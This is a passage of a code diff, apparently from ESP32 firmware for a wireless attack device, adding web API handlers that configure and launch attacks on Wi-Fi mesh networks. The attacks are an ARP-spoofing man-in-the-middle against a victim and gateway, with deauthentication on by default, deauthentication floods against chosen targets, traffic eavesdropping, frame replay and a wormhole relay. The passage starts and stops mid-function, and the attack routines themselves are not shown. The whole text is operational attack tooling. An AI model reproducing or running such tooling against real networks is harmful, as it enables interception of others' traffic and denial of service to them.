+        return ESP_FAIL;
+    }
+    while (remaining > 0) {
+        int len = httpd_req_recv(req, buf + total, remaining);
+        if (len <= 0) {
+            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+            return ESP_FAIL;
+        }
+        total += (size_t)len;
+        remaining -= len;
+    }
+    buf[total] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        ESP_LOGW(TAG, "MESH MITM: invalid JSON (len=%u): %.120s",
+                 (unsigned)total, buf);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    /* Accept snake_case or camelCase keys from UI / older clients */
+    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
+    cJSON *jpass   = cJSON_GetObjectItem(root, "password");
+    cJSON *jvmac   = cJSON_GetObjectItem(root, "victim_mac");
+    if (!jvmac) jvmac = cJSON_GetObjectItem(root, "victimMac");
+    cJSON *jvip    = cJSON_GetObjectItem(root, "victim_ip");
+    if (!jvip) jvip = cJSON_GetObjectItem(root, "victimIp");
+    cJSON *jgmac   = cJSON_GetObjectItem(root, "gateway_mac");
+    if (!jgmac) jgmac = cJSON_GetObjectItem(root, "gatewayMac");
+    cJSON *jgip    = cJSON_GetObjectItem(root, "gateway_ip");
+    if (!jgip) jgip = cJSON_GetObjectItem(root, "gatewayIp");
+    if (!jgip) jgip = cJSON_GetObjectItem(root, "parent_ip");
+    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
+    cJSON *jdeauth = cJSON_GetObjectItem(root, "deauth_first");
+    cJSON *jintv   = cJSON_GetObjectItem(root, "arp_interval_ms");
+
+    mesh_mitm_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsString(jssid) || jssid->valuestring[0] == '\0') {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Missing ssid");
+        return ESP_FAIL;
+    }
+    strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+
+    if (cJSON_IsString(jpass)) {
+        strncpy(cfg.password, jpass->valuestring, sizeof(cfg.password) - 1);
+    }
+
+    if (!cJSON_IsString(jvmac) || !parse_mac_arg(jvmac->valuestring, cfg.victim_mac)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid victim_mac");
+        return ESP_FAIL;
+    }
+
+    if (!cJSON_IsString(jvip) || !parse_ip_arg(jvip->valuestring, cfg.victim_ip)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid victim_ip");
+        return ESP_FAIL;
+    }
+
+    if (!cJSON_IsString(jgmac) || !parse_mac_arg(jgmac->valuestring, cfg.gateway_mac)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid gateway_mac");
+        return ESP_FAIL;
+    }
+    cfg.gateway_mac_set = true;
+
+    if (cJSON_IsString(jgip) && parse_ip_arg(jgip->valuestring, cfg.gateway_ip)) {
+        cfg.gateway_ip_set = true;
+    } else if (cfg.victim_ip[0] || cfg.victim_ip[1] || cfg.victim_ip[2] || cfg.victim_ip[3]) {
+        /* Common SoftAP/mesh parent is x.x.x.1 — recover when UI omitted gateway_ip */
+        memcpy(cfg.gateway_ip, cfg.victim_ip, 4);
+        cfg.gateway_ip[3] = 1;
+        cfg.gateway_ip_set = true;
+        ESP_LOGW(TAG, "MESH MITM: gateway_ip missing/bad ('%s') — derived %u.%u.%u.%u from victim",
+                 cJSON_IsString(jgip) ? jgip->valuestring : "(null)",
+                 cfg.gateway_ip[0], cfg.gateway_ip[1],
+                 cfg.gateway_ip[2], cfg.gateway_ip[3]);
+    } else {
+        ESP_LOGW(TAG, "MESH MITM: bad gateway_ip='%s' (present=%d type=%d) body=%.160s",
+                 cJSON_IsString(jgip) ? jgip->valuestring : "(null)",
+                 jgip != NULL, jgip ? jgip->type : -1, buf);
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST,
+                            "Missing/invalid gateway_ip (need e.g. 192.168.4.1)");
+        return ESP_FAIL;
+    }
+
+    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
+    if (cfg.channel == 0 && cJSON_IsString(jchan) && jchan->valuestring) {
+        cfg.channel = (uint8_t)atoi(jchan->valuestring);
+    }
+    /* Default ON — missing key used to leave deauth off and starve ARP refresh */
+    cfg.deauth_first = true;
+    if (jdeauth != NULL) {
+        cfg.deauth_first = cJSON_IsTrue(jdeauth) ||
+                           (cJSON_IsNumber(jdeauth) && jdeauth->valueint != 0) ||
+                           (cJSON_IsBool(jdeauth) && jdeauth->valueint);
+    }
+    cfg.arp_interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint
+                                                 : MESH_MITM_ARP_INTERVAL_MS;
+
+    char gip_str[16];
+    snprintf(gip_str, sizeof(gip_str), "%u.%u.%u.%u",
+             cfg.gateway_ip[0], cfg.gateway_ip[1],
+             cfg.gateway_ip[2], cfg.gateway_ip[3]);
+    ESP_LOGW(TAG, "MESH MITM: ssid=%s victim=%s/%s gateway=%s/%s ch=%u deauth=%d",
+             cfg.ssid, jvmac->valuestring, jvip->valuestring,
+             jgmac->valuestring, gip_str, cfg.channel, (int)cfg.deauth_first);
+
+    esp_err_t ret = mesh_mitm_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_mitm_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_mitm_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_mitm_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_mitm_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+/* ================================================================== */
+/*  MESH DoS HANDLERS                                                  */
+/* ================================================================== */
+
+static esp_err_t mesh_dos_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[768] = {0};
+    size_t total = 0;
+    int remaining = req->content_len;
+    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
+        return ESP_FAIL;
+    }
+    while (remaining > 0) {
+        int len = httpd_req_recv(req, buf + total, remaining);
+        if (len <= 0) {
+            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+            return ESP_FAIL;
+        }
+        total += (size_t)len;
+        remaining -= len;
+    }
+    buf[total] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
+    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
+    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
+    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
+    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
+    cJSON *jmethod = cJSON_GetObjectItem(root, "method");
+    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
+    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
+    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_size");
+    cJSON *jreason = cJSON_GetObjectItem(root, "reason_code");
+    cJSON *jextra  = cJSON_GetObjectItem(root, "extra_targets");
+
+    mesh_dos_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid parent_bssid");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
+        cfg.target_mac_set = true;
+    } else {
+        memset(cfg.target_mac, 0xFF, 6);
+    }
+
+    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
+    cfg.method = cJSON_IsNumber(jmethod)
+        ? (mesh_dos_method_t)jmethod->valueint
+        : MESH_DOS_METHOD_CHILD_DEAUTH;
+    cfg.interval_ms = cJSON_IsNumber(jintv) ? (uint16_t)jintv->valueint : 50;
+    cfg.burst_size  = cJSON_IsNumber(jburst) ? (uint16_t)jburst->valueint : 5;
+    cfg.reason_code = cJSON_IsNumber(jreason) ? (uint16_t)jreason->valueint : 7;
+
+    if (cJSON_IsString(jssid)) {
+        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+    }
+
+    if (cJSON_IsArray(jextra)) {
+        int n = cJSON_GetArraySize(jextra);
+        for (int i = 0; i < n && cfg.extra_target_count < MESH_DOS_MAX_TARGETS; i++) {
+            cJSON *item = cJSON_GetArrayItem(jextra, i);
+            if (cJSON_IsString(item) &&
+                parse_mac_arg(item->valuestring, cfg.extra_targets[cfg.extra_target_count])) {
+                cfg.extra_target_count++;
+            }
+        }
+    }
+
+    if (cfg.method <= MESH_DOS_METHOD_NONE || cfg.method >= MESH_DOS_METHOD_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid method");
+        return ESP_FAIL;
+    }
+
+    ESP_LOGW(TAG, "MESH DoS: bssid=%s method=%d burst=%u interval=%u",
+             jbssid->valuestring, (int)cfg.method, cfg.burst_size, cfg.interval_ms);
+
+    esp_err_t ret = mesh_dos_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_dos_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_dos_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        cJSON_AddNumberToObject(fallback, "packets_sent", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_dos_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_dos_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+/* ================================================================== */
+/*  MESH EAVESDROP HANDLERS                                            */
+/* ================================================================== */
+
+static esp_err_t mesh_eavesdrop_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[512] = {0};
+    size_t total = 0;
+    int remaining = req->content_len;
+    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
+        return ESP_FAIL;
+    }
+    while (remaining > 0) {
+        int len = httpd_req_recv(req, buf + total, remaining);
+        if (len <= 0) {
+            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+            return ESP_FAIL;
+        }
+        total += (size_t)len;
+        remaining -= len;
+    }
+    buf[total] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
+    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
+    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
+    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
+    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
+    cJSON *jfilter = cJSON_GetObjectItem(root, "filter");
+    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
+
+    mesh_eavesdrop_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsNumber(jchan) || jchan->valueint <= 0) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "channel required");
+        return ESP_FAIL;
+    }
+    cfg.channel = (uint8_t)jchan->valueint;
+
+    if (cJSON_IsString(jbssid) && parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
+        cfg.parent_bssid_set = true;
+    }
+    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
+        cfg.target_mac_set = true;
+    }
+
+    cfg.filter = cJSON_IsNumber(jfilter)
+        ? (mesh_eavesdrop_filter_t)jfilter->valueint
+        : MESH_EAVES_FILTER_ALL;
+    if (cfg.filter >= MESH_EAVES_FILTER_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid filter");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jssid)) {
+        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+    }
+
+    ESP_LOGW(TAG, "MESH Eavesdrop: ch=%u filter=%d bssid_set=%d target_set=%d",
+             cfg.channel, (int)cfg.filter, cfg.parent_bssid_set, cfg.target_mac_set);
+
+    esp_err_t ret = mesh_eavesdrop_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_eavesdrop_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_eavesdrop_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        cJSON_AddNumberToObject(fallback, "packets_rx", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_eavesdrop_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_eavesdrop_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+/* ================================================================== */
+/*  MESH REPLAY HANDLERS                                               */
+/* ================================================================== */
+
+static esp_err_t mesh_replay_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[512] = {0};
+    size_t total = 0;
+    int remaining = req->content_len;
+    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
+        return ESP_FAIL;
+    }
+    while (remaining > 0) {
+        int len = httpd_req_recv(req, buf + total, remaining);
+        if (len <= 0) {
+            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+            return ESP_FAIL;
+        }
+        total += (size_t)len;
+        remaining -= len;
+    }
+    buf[total] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
+    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
+    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
+    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
+    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
+    cJSON *jfilter = cJSON_GetObjectItem(root, "filter");
+    cJSON *jmode   = cJSON_GetObjectItem(root, "mode");
+    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
+    cJSON *jintv   = cJSON_GetObjectItem(root, "replay_interval_ms");
+    cJSON *jreps   = cJSON_GetObjectItem(root, "replay_per_frame");
+
+    mesh_replay_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsNumber(jchan) || jchan->valueint <= 0) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "channel required");
+        return ESP_FAIL;
+    }
+    cfg.channel = (uint8_t)jchan->valueint;
+
+    if (cJSON_IsString(jbssid) && parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
+        cfg.parent_bssid_set = true;
+    }
+    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
+        cfg.target_mac_set = true;
+    }
+
+    cfg.filter = cJSON_IsNumber(jfilter)
+        ? (mesh_replay_filter_t)jfilter->valueint
+        : MESH_REPLAY_FILTER_MGMT;
+    if (cfg.filter >= MESH_REPLAY_FILTER_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid filter");
+        return ESP_FAIL;
+    }
+
+    cfg.mode = cJSON_IsNumber(jmode)
+        ? (mesh_replay_mode_t)jmode->valueint
+        : MESH_REPLAY_MODE_LIVE;
+    if (cfg.mode >= MESH_REPLAY_MODE_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jssid)) {
+        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+    }
+    if (cJSON_IsNumber(jintv) && jintv->valueint > 0) {
+        cfg.replay_interval_ms = (uint16_t)jintv->valueint;
+    } else {
+        cfg.replay_interval_ms = 200;
+    }
+    if (cJSON_IsNumber(jreps) && jreps->valueint > 0) {
+        cfg.replay_per_frame = (uint8_t)jreps->valueint;
+    } else {
+        cfg.replay_per_frame = 1;
+    }
+
+    ESP_LOGW(TAG, "MESH Replay: ch=%u mode=%d filter=%d bssid_set=%d target_set=%d",
+             cfg.channel, (int)cfg.mode, (int)cfg.filter,
+             cfg.parent_bssid_set, cfg.target_mac_set);
+
+    esp_err_t ret = mesh_replay_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_replay_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_replay_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        cJSON_AddNumberToObject(fallback, "frames_captured", 0);
+        cJSON_AddNumberToObject(fallback, "frames_replayed", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_replay_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_replay_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_wormhole_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[512] = {0};
+    size_t total = 0;
+    int remaining = req->content_len;
+    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
+        return ESP_FAIL;
+    }
+    while (remaining > 0) {
+        int len = httpd_req_recv(req, buf + total, remaining);
+        if (len <= 0) {
+            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+            return ESP_FAIL;
+        }
+        total += (size_t)len;
+        remaining -= len;
+    }
+    buf[total] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *ja     = cJSON_GetObjectItem(root, "endpoint_a");
+    if (!ja) ja = cJSON_GetObjectItem(root, "endpoint_a_mac");
+    cJSON *jb     = cJSON_GetObjectItem(root, "endpoint_b");
+    if (!jb) jb = cJSON_GetObjectItem(root, "endpoint_b_mac");
+    cJSON *jbssid = cJSON_GetObjectItem(root, "parent_bssid");
+    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
+    cJSON *jchan  = cJSON_GetObjectItem(root, "channel");
+    cJSON *jmode  = cJSON_GetObjectItem(root, "mode");
+    cJSON *jact   = cJSON_GetObjectItem(root, "action");
+    cJSON *jfilt  = cJSON_GetObjectItem(root, "filter");
+    cJSON *jssid  = cJSON_GetObjectItem(root, "ssid");
+    cJSON *jdelay = cJSON_GetObjectItem(root, "tunnel_delay_ms");
+
+    mesh_wormhole_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsNumber(jchan) || jchan->valueint <= 0) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "channel required");
+        return ESP_FAIL;
+    }
+    cfg.channel = (uint8_t)jchan->valueint;
+
+    if (!cJSON_IsString(ja) || !parse_mac_arg(ja->valuestring, cfg.endpoint_a)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "endpoint_a MAC required");
+        return ESP_FAIL;
+    }
+    if (!cJSON_IsString(jb) || !parse_mac_arg(jb->valuestring, cfg.endpoint_b)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "endpoint_b MAC required");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jbssid) && parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
+        cfg.parent_bssid_set = true;
+    }
+
+    cfg.mode = cJSON_IsNumber(jmode)
+        ? (mesh_wormhole_mode_t)jmode->valueint
+        : MESH_WORMHOLE_MODE_BIDIR;
+    if (cfg.mode >= MESH_WORMHOLE_MODE_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid mode");
+        return ESP_FAIL;
+    }
+
+    cfg.action = cJSON_IsNumber(jact)
+        ? (mesh_wormhole_action_t)jact->valueint
+        : MESH_WORMHOLE_ACTION_RELAY;
+    if (cfg.action >= MESH_WORMHOLE_ACTION_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid action");
+        return ESP_FAIL;
+    }
+
+    cfg.filter = cJSON_IsNumber(jfilt)
+        ? (mesh_wormhole_filter_t)jfilt->valueint
+        : MESH_WORMHOLE_FILTER_ALL;
+    if (cfg.filter >= MESH_WORMHOLE_FILTER_COUNT) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid filter");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jssid)) {
+        strncpy(cfg.ssid, jssid->valuestring, sizeof(cfg.ssid) - 1);
+    }
+    if (cJSON_IsNumber(jdelay) && jdelay->valueint >= 0) {
+        cfg.tunnel_delay_ms = (uint16_t)jdelay->valueint;
+    }
+
+    ESP_LOGW(TAG, "MESH Wormhole: ch=%u mode=%d action=%d filter=%d",
+             cfg.channel, (int)cfg.mode, (int)cfg.action, (int)cfg.filter);
+
+    esp_err_t ret = mesh_wormhole_start(&cfg);
+    cJSON_Delete(root);
+
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", ret == ESP_OK);
+    cJSON_AddStringToObject(resp, "status", esp_err_to_name(ret));
+    return send_json_response(req, resp);
+}
+
+static esp_err_t mesh_wormhole_status_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    cJSON *status = mesh_wormhole_get_status_json();
+    if (!status) {
+        cJSON *fallback = cJSON_CreateObject();
+        cJSON_AddBoolToObject(fallback, "active", false);
+        cJSON_AddStringToObject(fallback, "status", "Idle");
+        cJSON_AddNumberToObject(fallback, "frames_captured", 0);
+        cJSON_AddNumberToObject(fallback, "frames_tunneled", 0);
+        return send_json_response(req, fallback);
+    }
+    return send_json_response(req, status);
+}
+
+static esp_err_t mesh_wormhole_stop_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    mesh_wormhole_stop();
+    cJSON *resp = cJSON_CreateObject();
+    cJSON_AddBoolToObject(resp, "success", true);
+    cJSON_AddStringToObject(resp, "status", "stopped");
+    return send_json_response(req, resp);
+}
+
+/* ================================================================== */
+/*  MESH L2 DEAUTH HANDLERS                                            */
+/* ================================================================== */
+
+static esp_err_t mesh_l2_deauth_start_handler(httpd_req_t *req)
+{
+    if (!request_is_authenticated(req)) {
+        httpd_resp_send_err(req, HTTPD_401_UNAUTHORIZED, "Unauthorized");
+        return ESP_FAIL;
+    }
+
+    char buf[768] = {0};
+    size_t total = 0;
+    int remaining = req->content_len;
+    if (remaining <= 0 || remaining >= (int)sizeof(buf)) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Bad/oversized body");
+        return ESP_FAIL;
+    }
+    while (remaining > 0) {
+        int len = httpd_req_recv(req, buf + total, remaining);
+        if (len <= 0) {
+            httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "No body");
+            return ESP_FAIL;
+        }
+        total += (size_t)len;
+        remaining -= len;
+    }
+    buf[total] = '\0';
+
+    cJSON *root = cJSON_Parse(buf);
+    if (!root) {
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid JSON");
+        return ESP_FAIL;
+    }
+
+    cJSON *jbssid  = cJSON_GetObjectItem(root, "parent_bssid");
+    if (!jbssid) jbssid = cJSON_GetObjectItem(root, "bssid");
+    cJSON *jtarget = cJSON_GetObjectItem(root, "target_mac");
+    if (!jtarget) jtarget = cJSON_GetObjectItem(root, "dest_mac");
+    cJSON *jchan   = cJSON_GetObjectItem(root, "channel");
+    cJSON *jmode   = cJSON_GetObjectItem(root, "mode");
+    cJSON *jssid   = cJSON_GetObjectItem(root, "ssid");
+    cJSON *jintv   = cJSON_GetObjectItem(root, "interval_ms");
+    cJSON *jburst  = cJSON_GetObjectItem(root, "burst_size");
+    cJSON *jreason = cJSON_GetObjectItem(root, "reason_code");
+    cJSON *jextra  = cJSON_GetObjectItem(root, "extra_targets");
+
+    mesh_l2_deauth_config_t cfg;
+    memset(&cfg, 0, sizeof(cfg));
+
+    if (!cJSON_IsString(jbssid) || !parse_mac_arg(jbssid->valuestring, cfg.parent_bssid)) {
+        cJSON_Delete(root);
+        httpd_resp_send_err(req, HTTPD_400_BAD_REQUEST, "Invalid parent_bssid");
+        return ESP_FAIL;
+    }
+
+    if (cJSON_IsString(jtarget) && parse_mac_arg(jtarget->valuestring, cfg.target_mac)) {
+        cfg.target_mac_set = true;
+    } else {
+        memset(cfg.target_mac, 0xFF, 6);
+    }
+
+    cfg.channel = cJSON_IsNumber(jchan) ? (uint8_t)jchan->valueint : 0;
+    cfg.mode = cJSON_IsNumber(jmode)
+        ? (mesh_l2_deauth_mode_t)jmode->valueint
